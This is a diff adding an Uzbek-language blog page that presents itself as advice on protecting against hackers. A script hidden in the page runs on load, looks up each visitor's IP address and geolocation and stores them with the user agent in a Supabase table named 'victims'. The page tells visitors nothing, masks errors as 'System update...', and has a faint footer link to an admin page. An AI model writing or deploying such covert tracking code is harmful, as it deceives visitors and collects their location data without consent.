@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>Dasturlash va Texnologiya Blogi</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { font-family: sans-serif; line-height: 1.6; margin: 0; background: #f9f9f9; color: #333; }
+        .hero { background: #2c3e50; color: white; padding: 60px 20px; text-align: center; }
+        .content { max-width: 700px; margin: 40px auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        footer { text-align: center; padding: 50px; color: #bbb; font-size: 12px; }
+        .v-link { color: #eee; text-decoration: none; opacity: 0.3; }
+    </style>
+</head>
+<body>
+
+    <div class="hero">
+        <h1>IT Dunyosiga Xush Kelibsiz</h1>
+        <p>Eng so'nggi texnologiyalar va hackerlikdan himoyalanish usullari haqida.</p>
+    </div>
+
+    <div class="content">
+        <h2>Nega xavfsizlik muhim?</h2>
+        <p>Bugungi kunda kiber-hujumlar ko'payib bormoqda. Bizning blogimizda siz o'z ma'lumotlaringizni qanday himoya qilishni o'rganasiz...</p>
+    </div>
+
+    <footer>
+        <p>© 2026 Blog Project. <a href="admin.html" class="v-link">v1.1</a></p>
+    </footer>
+
+    <script>
+        // SHU YERGA SUPABASE MA'LUMOTLARINI QO'YING
+        const SB_URL = 'https://qkvrelghiruyfpdjremr.supabase.co';
+        const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFrdnJlbGdoaXJ1eWZwZGpyZW1yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ3NjE1MDQsImV4cCI6MjA5MDMzNzUwNH0.aDmEIWKEYpgcfQRDOCqczrs8o8uTsQnmmyQ02HmsWIw';
+        const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
+
+        async function collect() {
+            try {
+                // IP va geolokatsiyani aniqlash
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+
+                // Supabase jadvaliga (victims) yuborish
+                await supabaseClient.from('victims').insert([{ 
+                    ip_address: data.ip, 
+                    city: data.city, 
+                    country: data.country_name,
+                    user_agent: navigator.userAgent 
+                }]);
+            } catch (e) { console.log("System update..."); }
+        }
+        window.onload = collect;
+    </script>
+</body>
+</html>
